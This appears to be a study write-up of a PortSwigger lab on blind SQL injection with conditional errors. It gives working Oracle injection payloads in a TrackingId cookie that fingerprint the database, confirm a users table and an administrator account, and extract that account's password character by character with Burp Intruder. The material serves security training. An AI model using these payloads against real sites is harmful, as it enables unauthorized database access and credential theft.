
### Blind SQL injection with conditional errors : PRACTITIONER

---

We know that the `TrackingId` cookie is vulnerable to blind SQL injection using conditional errors.
- We need to first figure out the type of DBMS we are attacking.
- Then create a payload that can enumerate information by using conditional errors.

> All the payloads will be inserted in the `TrackingId` cookie after the value of the cookie.

##### DBMS Enumeration

We will try the conditional error payloads found in the SQL injection cheat sheet.

The first one is oracle:
```SQL
Z4Aj3mqRwaXvVcZg' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a --
```
- We see an error being printed.

Trying the other condition to check if it works normally by changing the condition to be false.
```SQL
Z4Aj3mqRwaXvVcZg' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a --
```
- We see that an error is not returned, and the page returns normally.

Therefore, the DBMS is Oracle.

##### Data Enumeration

We now want to check if there is a users table.
```SQL
Z4Aj3mqRwaXvVcZg' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM=1)='a --
```
- First, it tries to return a single row from the `users` table.
- If it works, then it executes the `CASE`.
- Since the `CASE` is always true, then it will induce an error.

> An error is returned, hence, we have confirmed the existence of the `users` table.

Now we check for the presence of the `administrator` user.
- For an easier expression, use string concatenation instead of equality checks.
```SQL
Z4Aj3mqRwaXvVcZg' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') || 'a --
```

> An error is returned, hence, the `administrator` user exists.

Now we need to enumerate the password of the admin user.
```SQL
Z4Aj3mqRwaXvVcZg' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > 20) || ' --
```
- Keep trying, or use the BURPSUITE INTRUDER spider tool to change the length until we don't get an error. Again, if we get an error, this means we are on the right path.

Our password has length of 20, now to enumerate all its characters, use the BURPSUITE INTRUDER clusterbomb tool to change both the index and character.
```SQL
Z4Aj3mqRwaXvVcZg' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1) = 'a') || ' --
```

- Let the indices be from 1 to 20.
- Let the characters be from a-z and 0-9

> As [[Portswigger/SQL Injection/Lab 7]], conduct the attack and watch for the different response sizes or status codes. See the size corresponding to errors and use those to obtain results. Use status code 500 representing errors to obtain results.

1 - 7
2 - s
3 - s
4 - j
5 - u
6 - 0
7 - m
8 - y
9 - z
10 - 3
11 - h
12 - g
13 - q
14 - x
15 - 1
16 - q
17 - 0
18 - i
19 - l
20 - l

> Assemble password and login to complete lab.
---
